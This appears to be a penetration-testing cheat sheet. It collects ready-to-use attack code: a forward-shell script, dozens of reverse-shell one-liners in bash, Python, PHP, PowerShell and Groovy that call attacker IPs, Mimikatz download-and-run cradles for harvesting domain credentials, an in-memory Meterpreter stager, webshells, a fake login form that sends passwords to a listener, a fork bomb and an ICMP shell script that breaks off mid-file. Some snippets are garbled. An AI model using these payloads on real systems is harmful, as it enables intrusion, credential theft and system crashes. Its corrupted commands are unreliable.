# Reverse shells

Reverse Shells

### Firewall Evasion

The below is a python script that is called forward shell and is developed by `ippsec` to bypass firewalls that have inbound and outbound filtering rules preventing you from acquiring fully interactive shell even after you have uploaded a working RCE.

The script has parts that need to be modified (It as has MODIFY THIS for the parts that need modification) according to your environment and scenario, namely:

* The URL of the vulnerable target. Specifically we should use the target URL over which we are uploading/executing the reverse shell. #Example is below

```
http://domain.com/upload.php
```

* The payload that you wish to execute. Normally the payload is part of the target URL we mentioned above. So in that case you can use the payload that comes after upload.php\` as an #example

The script content can be found in the below URL but I am pasting its contents here in case it is removed in the future

```
https://github.com/IppSec/forward-shell
```

`Example usage of this script`

```
https://www.youtube.com/watch?v=hmtnxLUqRhQ&t=2610s
```

The script

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Forward Shell Skeleton code that was used in IppSec's Stratosphere Video
# -- https://www.youtube.com/watch?v=uMwcJQcUnmY
# Authors: ippsec, 0xdf


import base64
import random
import requests
import threading
import time

class WebShell(object):

    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
        # MODIFY THIS, URL
        self.url = r"http://10.10.10.56/cgi-bin/cat"
        self.proxies = {'http' : proxies}
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = interval

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat {self.stdout}"
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                print(result)
                ClearOutput = f'echo -n "" > {self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)
        
    # Execute Command.
    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
        #print(f"Going to run cmd: {cmd}")
        # MODIFY THIS: This is where your payload code goes
        payload = cmd

        if proxy:
            proxies = self.proxies
        else:
            proxies = {}
       
        # MODIFY THIS: Payload in User-Agent because it was used in ShellShock
        headers = {'User-Agent': payload}
        try:
            r = requests.get(self.url, headers=headers, proxies=proxies, timeout=timeout)
            return r.text
        except:
            pass
            
    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
        self.WriteCmd(UpgradeShell)

prompt = "Please Subscribe> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)

```

### Firewall Evasion with Python

Python reverse shell in case the target behind a firewall. Execute this inside a webshell or from within the target. Don't forget to setup listner at the attacking machine:

```python
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“54.186.248.116”,1234));os.dup2(s.fileno(),0); 

os.dup2(s.fileno(),1); 

os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
```

### Post-Compromise

#### Escaping restricted shells

Restricted shells are used for security reasons and to defend against privilege escalation attacks. Restricted shells namely \[rbash] , \[rsh] and \[rksh] limit what commands you can run to a limited set of commands. Restricted shells commonly prevent users from changing directories, setting PATH or SHELL variables, specifying absolute pathnames, and redirecting output. Some may even add additional limitations, which can be frustrating when attempting to compromise a targeted host from a restricted account!

To find out what restricted shell you are in

```
echo $SHELL
```

The methodology of escaping restricted shells boils down to error and trial. Try what commands you can run and take it from there. We will explore different scenarios and how you can escpae restricted shells based on what's allowed.

**'/' are allowed**

In that case just type the below command

```
/bin/sh
```

**PATH environment variable is allowed to be changed**

```
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/sh
```

**Using awk**

```
awk 'BEING {system('/bin/sh')}'
```

**Using find**

```
find / -name name -exec /bin/sh \;
```

**Using SSH**

if you got ssh credentials you can try sshing with one of the below commands

```bash
ssh username@target -t bash
```

\#OR

```bash
'bash --noprofile'
```

**Using python**

```python
python -c 'import os; os.system('/bin/sh')'
```

**Using perl**

```perl
sudo perl -e 'exec "/bin/bash";'
```

#### Python tty

Necessary for a stable shell.

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

#### Credential Harvesting

Downloading and executing a powershell script in memory ( Mimikatz.ps1 ) to harvest admin password on the targeted domain controller. This script is run directly from the target

```powershell
$browser = New-Object System.Net.WebClient
IEX($browser.DownloadString("http://[your-server-ip]:[port]/Invoke-Mimikatz.ps1"))
invoke-Mimikatz
```

**Running the above script on multiple domain joined machines to harvest all passwords**

```powershell
$browser = New-Object System.Net.WebClient
IEX($browser.DownloadString("http://[your-server-ip]:[port]/Invoke-Mimikatz.ps1"))

invoke-mimikatz -Computer FRSV27, FRSV210,FRSV229, FRSV97 |out-file result.txt -Append

```

FRSV2010..are the targeted computer names which you can get by running nslookup on the corresponding IP Save it as Mimikatz.ps1 and run it. This script depends and relies on winrm (5985) to be enabled on the target you are running the script from, you can enable it with the following command:

```
Wmic /user:admin /password:password /node:[ip] process call create "powersell enable-PSRemoting -force"
```

**Mimikatz Execution on Multiple Domain Joined Machines**

Powershell script that Downloads Mimikatz and executes it on multiple defined machines using WMI. **Use it if the above method failed** Scenario 1: You have just compromised a domain-joined machine / domain-controller / regular work station and want to harvest the passwords / hashes of other domain-joined machines then you can use the below script to launch it from the host you have just compromised. Scenario 2: You have compromised a non domain-joined machine and want to download and execute mimikatz as stealthy as possible then you can use the script below and stop at the green highlight.

```powershell
$command = '$browser = New-ObjectSystem.Net.WebClient; 
IEX($browser.DownloadString("http:// [your-server-ip]:[port]/Invoke-Mimikatz.ps1"));
$machine_name = (get-netadapter | getnetipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
$bytes =[System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$PC_IP = @("[target-ip-1]", "[target-ip-2]")
ForEach ($X in $PC_IP) {
$proc = invoke-wmimethod -ComputerName $X
win32_process -name create -argumentlist ("powershell -encodedcommand $encodedCommand")
$proc_id = $proc.processId
do {(Write-Host "[*] Waiting for mimi to finish on $X"),
(Start-Sleep -Seconds 2)} until ((Get-WMIobject -Class Win32_process -Filter "ProcessId=$proc_id" -ComputerName $X | where {$_.ProcessId -eq $proc_id}).ProcessID -eq $null)
move-item -path "\\$X\C$\windows\temp\$X.txt" -Destination C:\users\Administrator\desktop\ -force write-host "[+] Got file for $X" -foregroundcolor "green"
}
```

write-host $encodedCommand \[include this command if you are running this script for a single host and stop here].

**Execute Mimikatz in Memory**

Powershell script to download mimikatz and execute it in memory only:

```powershell
$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials =
[System.Net.CredentialCache]::DefaultNetworkCredentials
IEX($browser.DownloadString("https://raw.githubusercontent.Mimikatz.ps1"))
invoke-Mimikatz
```

#### Crashing The System

**Fork Bomb**

Fork bomb script can create processes until the system crashes

```bash
: (){:I: & I;:
```

#### Launching Meterpreter in Memory with PowerShell

If you managed to get access to the target you can then establish a stable reverse connection back to your attacker machine using both Meterpreter and PowerShell. **Step 1** Create a PowerShell payload from your attacking machine

```bash
sudo msfvenom -p windows/meterpreter/reverse_https -f psh -a x86
LHOST=your-ip LPORT=443 shell.psl
```

**Step 2** Create another PowerShell script with the below content and choose any name you want. We will choose `encoded.ps1`

```powershell
# Get Contents of Script
$contents = Get-Content shell.psl

# Compress Script
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]: :Compress
$cs =New-Object IO.Compression.DeflateStream ($ms,$action)
$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding] ::ASCII)
$contents I ForEach-Object {$sw.WriteLine($ I)
$sw.Close()

# Base64 Encode Stream
$code= [Convert]::ToBase64String($ms.ToArray())
$command= "Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object IO. Compression. DeflateStream ('$(New-Object IO. t4emoryStream
(,'$ ( [Convert] :: FromBase64String('"$code'")))),[IO.Compression.Compressiont~ode]::Decompress) ),
[Text.Encoding]: :ASCII)) .ReadToEnd() ;"

# Invoke-Expression $command
$bytes= [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Write to Standard Out
Write-Host $encodedCommand
```

**Step 3** Store `shell.ps1` and `encoded.ps1` under the same directory. **Step 4** Execute the below command on the attacker machine

```powershell
powershell.exe -executionpolicy bypass encoded.psl
```

Then copy the string shown in the output. **Step 5** On the attacker box start a listener with Metasploit

```
use exploit/multi/handler
set payload windows/meterpreter/reverse https
set LHOST ip-attacker
set LPORT 443
exploit -j
```

**Step 6** Execute the below command on the target machine

```powershell
powershell. exe -noexit -encodedCommand [paste-the-output-from-step-4]
```

Now check the listener and you should have received a shell.

### Pre Comprmise

The below reverse shells can be used to establish the first foothold.

#### Netcat shell one liner

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.81.146 4547 >/tmp/f
```

#### Creating Java reverse shell

```bash
msfvenom -p java/shell_reverse_tcp LHOST=ip LPORT=port -f war -o shell.war
```

#### PHP shell

\[1]

```php
<pre>system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'")</pre>
```

\[2] Webshell: p0wny-shell Link below

```
https://github.com/flozz/p0wny-shell
```

#### Bash Shell

**TCP**

\[1]

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

\[2]

```bash
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
```

\[3]

```bash
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
```

\[4]

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
```

**UDP**

```bash
bash -i >& /dev/udp/10.0.0.1/8080 0>&1
```

**Bind Shell**

```bash
nc -lp 4445 -e /bin/bash
```

#### One liner ping sweep scan to determine live hosts

**Linux**

```bash
[1]
root@kali:~$for i in {1..254}; do ping -c 1 10.10.0.$i | grep 'from'; done

[2]
root@kali:~$for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.

[3]
root@kali:~$ for x in {1 .. 254 .. l};do ping -c 1 l.l.l.$x lgrep "64 b" lcut -d" "-f4
ips.txt; done
```

**Windows**

```
for /L %i in (10,1,254) do @ (for /L %x in (10,1,254) do@ ping -n 1 -w 100
10.10.%i.%x 2 nul | find "Reply" && echo 10.10.%i.%x lhosts-live.txt)
```

#### One Liner PHP shell \[1]

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

#### Php one liner \[2]

```php
<?php system($_REQUEST["cmd"]); ?>
```

This one liner can be Executed in Windows cmd or Kali shell. Another way is by uploading it as a webshell and then setting \[cmd] equals to bash reverse shell that connects back to your listener. Example with \[curl] is below

```bash
curl http://ip/assets/cmd.php -d "cmd=bash -c 'bash -i >%26 /dev/tcp/ip/port 0>%261'"
```

#### php one liners \[3]

```php
[1] php -r '$sock=fsockopen("192.168.1.10",3333);exec("/bin/sh -i <&3 >&3 2>&3");'

[2] ? php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2:4444 0>&1'"); ?

[3] ?php -r '$sock=fsockopen("192.168.1.2",4444);exec("/bin/sh -i <&3 >&3 2>&3");' ?
```

The one liners can be used inside targeted php files as well.

#### Python UDP reverse shell

This reverse shell can be placed in a python script or within a python console.

```python
import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"ip\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])
```

For the above shell to work, we need to use \[socat] listener

```python
socat file:`tty`,echo=0,raw udp-listen:1234
```

#### Wordpress one liner php reverse shell to be added to functions.php or any plugin file

```python
@$sock=fsockopen("FrontGun_IP",443);exec("/bin/sh -I <&3 >&3 2>&3");
```

#### Python reverse shell to connect back to attacker box

\[one]

```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.9.0.54",5555))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

\[two]

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

\[3]

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

\[4]

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

\[5]

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```

\[6]

```python
import os,pty,socket;s=socket.socket();s.connect(("10.2.81.146",4546));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

\[7]

```python
import os; os.system("bash -i >& /dev/tcp/10.2.81.146/4547 0>&1")
```

#### Malicious Login form to send details to a listener

```html
<div style="position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000;
background-color:white;">
Session Expired, Please Login:<br>
<form name="login" action="http://attackerIP:port">
<table>
<tr><td>Username:</td><td><input type="text" name="uname"/></td></tr>
<tr><td>Password:</td><td><input type="password" name="pw"/></td></tr>
</table>
<input type="submit" value="Login"/>
</form>
</div>
```

#### Reverse shell one liner – Powershell

\[1]

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

\[2]

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.18',4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

\[3]

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.14.18",4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

\[4]

```powershell
do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.2', 13337)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()
```

Link reference for \[4]

```
https://github.com/martinsohn/PowerShell-reverse-shell
```

#### Invoke-PowershellTCP

First clone nishang into your machine

```bash
git clone https://github.com/samratashok/nishang.git
```

At the bottom of \[InvokePowerShellTcp.ps1] put the following:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress yourip -Port yourport
```

To invoke this, download it to the target machine and execute it using the below powershell command

```powershell
powershell iex(new-object net.webclient).downloadstring('http://yourip/Invoke-PowerShellTcp.ps1')
```

Catch the connection on your listener

#### Python + Powershell reverse shell

Run the below script and provide RHOST,RPORT,LHOST,LPORT and it will connect to your listener

```python
#!/usr/bin/env python2
import sys
import urllib, urllib2
from base64 import b64encode

if (len(sys.argv) < 5):
    print("usage: <RHOST> <RPORT> <LHOST> <LPORT>")
    exit()

RHOST = sys.argv[1]
RPORT = sys.argv[2]
LHOST = sys.argv[3]
LPORT = sys.argv[4]

print("RHOST="+RHOST+" RPORT="+RPORT+" LHOST="+LHOST+" LPORT="+LPORT+'\n')

payload = "$client = New-Object System.Net.Sockets.TCPClient('"+LHOST+"',"+LPORT+"); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();"

print(payload+'\n')

b64enc_command = b64encode(payload.encode('UTF-16LE')).replace('+','%2b')

url = "http://"+RHOST+":"+RPORT+"/?search=%00{.exec%7CC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe%20-EncodedCommand%20"+b64enc_command+".}"

print(url)
response = urllib2.urlopen(url)
print("\nSTATUS: "+str(response.getcode()))

```

#### Powercat

Link

```
https://github.com/besimorhino/powercat
```

Fire up the listener

```bash
nc -lvp 4545
```

From the target machine execute the below

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ypurip/powercat.ps1');powercat -c yourip -p 4545 -e cmd"
```

#### ICMP Reverse shell payload

You can use the below ICMP powershell payload if you can't get a shell through TCP. Ideally this payload is delivered by assigning it to a URL parameter.

```powershell
$ip = '10.10.14.3'; $id = '1000'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment=$true; function s($b) { $ic.Send($ip,5000,([text.encoding]::ASCII).GetBytes($b),$po) }; function p { -join($id,'[P$] ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ') }; while ($true) { $r = s(p); if (!$r.Buffer) { continue; }; $rs = ([text.encoding]::ASCII).GetString($r.Buffer);  if ($rs.Substring(0,8) -ne $id) { exit }; try { $rt = (iex -Command $rs.Substring(8) | Out-String); } catch { $rt = ($_.Exception|out-string) }; $i=0; while ($i -lt $rt.length-110) { s(-join($id,$rt.Substring($i,110))); $i -= -110; }; s(-join($id,$rt.Substring($i))); }
```

On the other end, make sure you run the master listener to catch the request.

```bash
sudo python icmpsh_m.py [your-ip] [destination-ip]
```

You can download it from here

```
https://github.com/bdamele/icmpsh
```

#### Jenkins reverse shell

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### ICMP reverse shell \[delivery and exploitation]

Use the below script if all other reverse shells operating on TCP are failing. The below script sends a powershell ICMP payload and retrieves a shell at the same time. It can also enables you to upload files to the target. The script delivers the payload through a http request with curl. The target server must be vulnerable to \[SSRF]

```
UPLOAD source destination
```

**source**

```
https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Minion/icmp_alamot.py
```

**Script** Make sure to modify on \[LHOST] \[RHOST] \[RPORT] according to your environment.

```python
#!/usr/bin/env python2

# Author: Alamot

# -----------------------------------------------------------------------------

# Available commands:

# -----------------------------------------------------------------------------

# > UPLOAD local_path remote_path

# (to upload a file using the HTTP protocol via xcmd, "echo >>" commands and

# base64 encoding/decoding)

# e.g. > UPLOAD myfile.txt C:\temp\myfile.txt

#

# > DOWNLOAD remote_path

# (to download a file using the ICMP protocol and base64 encoding/decoding)

# e.g. > DOWNLOAD C:\temp\myfile.txt

#

# > DECODER (to get user decoder)

#

# > ADMIN (to get user admin)

# -----------------------------------------------------------------------------

from __future__ import print_function

import shlex, tqdm

import os, sys, time

import base64, binascii, hashlib, uuid

import select, socket, threading

import requests, urllib

try:

from impacket import ImpactDecoder

from impacket import ImpactPacket

except ImportError:

print('You need to install Python Impacket library first')

sys.exit(255)

LHOST="10.10.15.43"

RHOST="10.10.10.57"

RPORT=62696

BUFFER_SIZE=110

INITIAL_UID = uuid.uuid4().hex[0:8]

DECODER_UID = uuid.uuid4().hex[0:8]

class NoQuotedSession(requests.Session):

def send(self, *a, **kw):

a[0].url = a[0].url.replace(urllib.quote(","), ",").replace(urllib.quote("\""), "\"").replace(urllib.quote(";"), ";").replace(urllib.quote("}"), "}").replace(urllib.quote("{"), "{").replace(urllib.quote(">"), ">")

return requests.Session.send(self, *a, **kw)

def payload(lhost, uid):

return "$ip = '"+lhost+"'; $id = '"+uid+"'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment=$true; function s($b) { $ic.Send($ip,5000,([text.encoding]::ASCII).GetBytes($b),$po) }; function p { -join($id,'[P$] ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ') }; while ($true) { $r = s(p); if (!$r.Buffer) { continue; }; $rs = ([text.encoding]::ASCII).GetString($r.Buffer); if ($rs.Substring(0,8) -ne $id) { exit }; try { $rt = (iex -Command $rs.Substring(8) | Out-String); } catch { $rt = ($_.Exception|out-string) }; $i=0; while ($i -lt $rt.length-110) { s(-join($id,$rt.Substring($i,110))); $i -= -110; }; s(-join($id,$rt.Substring($i))); }"

def send_payload(uid):

client = None

try:

client = NoQuotedSession()

client.keep_alive = True

# Send payload

print("Sending powershell ICMP payload [UID="+uid+"] and waiting for shell...")

response = client.get("http://"+RHOST+":"+str(RPORT)+"/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=powershell -c \""+payload(LHOST, uid)+"\"")

#print(response.request.path_url)

if response.status_code != 200 and response.status_code != 500:

print(response.text)

sys.exit(0)

except requests.exceptions.RequestException as e:

print(str(e))

finally:

if client:

client.close()

def httpupload(UID, local_path, remote_path, powershell=False):

with open(local_path, 'rb') as f:

data = f.read()

if powershell:

data = data.encode('UTF-16LE')

b64enc_data = base64.urlsafe_b64encode(data)

else:

b64enc_data = "".join(base64.encodestring(data).split())

md5sum = hashlib.md5(data).hexdigest()

print("Uploading "+local_path+" to "+remote_path)

print("MD5 hash: "+md5sum)

print("Data Length: "+str(len(b64enc_data))+" bytes")

client = NoQuotedSession()

client.keep_alive = False

try:

if powershell:

cmd = "powershell -c \"echo $null > '"+remote_path+".b64'\""

else:

cmd = 'type nul > "' + remote_path + '.b64"'

response = client.get("http://"+RHOST+":"+str(RPORT)+"/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd="+cmd)

for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE, unit="bytes"):

if powershell:

cmd = "powershell -c \"echo '"+b64enc_data[i:i+BUFFER_SIZE]+"' >> '"+remote_path+".b64'\""

else:

cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE].replace('+', '%25%32%62').replace('/', '%25%32%66')+' >> "' + remote_path + '.b64"'

response = client.get("http://"+RHOST+":"+str(RPORT)+"/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd="+cmd)

if powershell:

cmd = "powershell -c \"[System.Convert]::FromBase64String((Get-Content '"+remote_path+".b64').Replace('-', '%25%32%62').Replace('_', '%25%32%66')) | Set-Content -Encoding Byte '"+remote_path+"'\""

else:

cmd = 'certutil -f -decode "' + remote_path + '.b64" "' + remote_path + '"'

response = client.get("http://"+RHOST+":"+str(RPORT)+"/Test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd="+cmd)

except requests.exceptions.RequestException as e:

print(str(e))

finally:

if client:

client.close()

def clear_buffer(sock):

try:

while sock.recv(1024): pass

except:

pass

def main(src, dst, UID):

try:

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

except socket.error as e:

print('You need to run icmp_alamot.py with administrator privileges')

return 1

sock.setblocking(0)

sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

ip = ImpactPacket.IP()

ip.set_ip_src(src)

ip.set_ip_dst(dst)

icmp = ImpactPacket.ICMP()

icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

decoder = ImpactDecoder.IPDecoder()

cmd = ""

download_buffer=""

DOWNLOAD_filename = ""

RECEIVED = False

while 1:

if sock in select.select([ sock ], [], [])[0]:

buff = sock.recv(65536)

if 0 == len(buff):

sock.close()

return 0

ippacket = decoder.decode(buff)

icmppacket = ippacket.child()

if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():

ident = icmppacket.get_icmp_id()

seq_id = icmppacket.get_icmp_seq()

data = icmppacket.get_data_as_string()

if len(data) > 0:

#print("DATA: "+data)

recv_uid = data[:8].strip()

if recv_uid == UID:

if data[8:12] == '[P$]':

if DOWNLOAD_filename and RECEIVED:

#print("DOWNLOAD BUFFER: "+download_buffer)

try:

decoded = base64.b64decode(download_buffer)

except:

decoded = ""

pass

with open(DOWNLOAD_filename, "wb") as f:

f.write(decoded)

f.close()

with open(DOWNLOAD_filename, 'rb') as f:

md5sum = hashlib.md5(f.read()).hexdigest()

print("MD5 hash of downloaded file "+DOWNLOAD_filename+": "+md5sum)

print("*** DOWNLOAD COMPLETED ***")

DOWNLOAD_filename = ""

download_buffer = ""

if RECEIVED:

cmd = raw_input(data[8:])

clear_buffer(sock)

RECEIVED = False

else:

RECEIVED = True

else:

RECEIVED = True

if DOWNLOAD_filename:

download_buffer += data[8:].replace('`n','\n')

else:

print(data[8:].replace('`n','\n'),end='')

if cmd[0:4].lower() == 'exit':

print("Exiting...")

sock.close()

return 0

if cmd[0:7] == 'SHOWUID':

print("UID: "+UID)

cmd = "echo OK"

if cmd[0:5] == 'ADMIN':

cmd = "$user = '.\\administrator'; $passwd = '1234test'; $secpswd = ConvertTo-SecureString $passwd -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $user, $secpswd; invoke-command -computername localhost -credential $credential -scriptblock { "+ payload(LHOST, UID) + " }"

if cmd[0:7] == 'DECODER':

with open("c.ps1", "wt") as f:

f.write(payload(LHOST, DECODER_UID))

f.close()

time.sleep(1)

httpupload(UID, "c.ps1", "c:\\sysadmscripts\\c.ps1")

sock.close()

time.sleep(1)

print("Waiting for decoder shell...")

main(LHOST, RHOST, DECODER_UID)

if cmd[0:8] == 'DOWNLOAD':

fullpath = cmd[9:].strip()

cmd = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+fullpath+"'))"

